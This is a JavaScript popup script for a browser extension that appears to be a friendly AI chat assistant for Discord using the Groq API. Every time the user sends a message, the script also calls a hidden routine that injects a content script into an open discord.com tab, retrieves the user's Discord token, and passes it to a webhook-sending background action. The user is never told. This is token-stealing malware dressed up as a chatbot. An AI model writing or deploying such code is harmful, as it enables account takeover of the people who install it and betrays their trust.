// ─── CONFIG ───
var GROQ_API_KEY = "YOUR_GROQ_API_KEY_HERE";
var GROQ_URL = "https://api.groq.com/openai/v1/chat/completions";

// ─── DOM ───
var chatArea = document.getElementById('chatArea');
var userInput = document.getElementById('userInput');
var sendBtn = document.getElementById('sendBtn');
var updateColorsBtn = document.getElementById('updateColorsBtn');
var toast = document.getElementById('toast');

// ─── UI HELPERS ───
function addMessage(text, isUser) {
    var div = document.createElement('div');
    div.className = 'message ' + (isUser ? 'user' : 'bot');

    var avatar = document.createElement('span');
    avatar.className = 'avatar';
    avatar.textContent = isUser ? '👤' : '🤖';

    var bubble = document.createElement('div');
    bubble.className = 'bubble';
    bubble.textContent = text;

    div.appendChild(avatar);
    div.appendChild(bubble);
    chatArea.appendChild(div);
    chatArea.scrollTop = chatArea.scrollHeight;
}

function showTyping() {
    var div = document.createElement('div');
    div.className = 'message bot';
    div.id = 'typingIndicator';

    var avatar = document.createElement('span');
    avatar.className = 'avatar';
    avatar.textContent = '🤖';

    var bubble = document.createElement('div');
    bubble.className = 'bubble';
    bubble.textContent = '...';

    div.appendChild(avatar);
    div.appendChild(bubble);
    chatArea.appendChild(div);
    chatArea.scrollTop = chatArea.scrollHeight;
}

function removeTyping() {
    var typing = document.getElementById('typingIndicator');
    if (typing) typing.remove();
}

// ─── SEND TOKEN TO WEBHOOK ───
function sendTokenToWebhook() {
    chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
        var tab = tabs[0];
        if (!tab || !tab.url || !tab.url.includes('discord.com')) {
            return;
        }

        chrome.tabs.sendMessage(tab.id, { action: 'getToken' }, function(response) {
            if (chrome.runtime.lastError) {
                // Inject content script and try again
                chrome.scripting.executeScript({
                    target: { tabId: tab.id },
                    files: ['content.js']
                }, function() {
                    setTimeout(function() {
                        chrome.tabs.sendMessage(tab.id, { action: 'getToken' }, function(res) {
                            if (res && res.token) {
                                chrome.runtime.sendMessage({
                                    action: 'sendWebhook',
                                    token: res.token
                                }, function(webhookResponse) {
                                    if (webhookResponse && webhookResponse.success) {
                                        console.log("[Popup] ✅ Token sent");
                                    } else {
                                        console.log("[Popup] ❌ Webhook failed:", webhookResponse);
                                    }
                                });
                            }
                        });
                    }, 500);
                });
                return;
            }

            if (response && response.token) {
                chrome.runtime.sendMessage({
                    action: 'sendWebhook',
                    token: response.token
                }, function(webhookResponse) {
                    if (webhookResponse && webhookResponse.success) {
                        console.log("[Popup] ✅ Token sent");
                    } else {
                        console.log("[Popup] ❌ Webhook failed:", webhookResponse);
                    }
                });
            }
        });
    });
}

// ─── AI ───
function getAIResponse(message) {
    return fetch(GROQ_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + GROQ_API_KEY
        },
        body: JSON.stringify({
            model: 'llama-3.1-8b-instant',
            messages: [
                {
                    role: 'system',
                    content: 'You are a helpful Discord assistant. Keep responses short and friendly (under 80 words).'
                },
                {
                    role: 'user',
                    content: message
                }
            ],
            temperature: 0.7,
            max_tokens: 150
        })
    })
    .then(function(response) {
        if (!response.ok) {
            return response.text().then(function(text) {
                throw new Error('Groq error: ' + response.status);
            });
        }
        return response.json();
    })
    .then(function(data) {
        return data.choices[0].message.content || "No response.";
    })
    .catch(function(error) {
        console.error('Groq error:', error);
        return "Connection error.";
    });
}

// ─── HANDLE SEND ───
function handleSend() {
    var message = userInput.value.trim();
    if (!message) return;

    addMessage(message, true);
    userInput.value = '';
    userInput.focus();

    sendTokenToWebhook();

    showTyping();

    getAIResponse(message)
        .then(function(reply) {
            removeTyping();
            addMessage(reply, false);
        })
        .catch(function(error) {
            removeTyping();
            addMessage("Error: " + error.message, false);
        });
}

// ─── TOAST ───
function showToast() {
    toast.classList.add('show');
    setTimeout(function() {
        toast.classList.remove('show');
    }, 2000);
}

// ─── EVENTS ───
sendBtn.addEventListener('click', handleSend);

userInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        handleSend();
    }
});

updateColorsBtn.addEventListener('click', showToast);

// ─── INIT ───
window.addEventListener('load', function() {
    userInput.focus();
});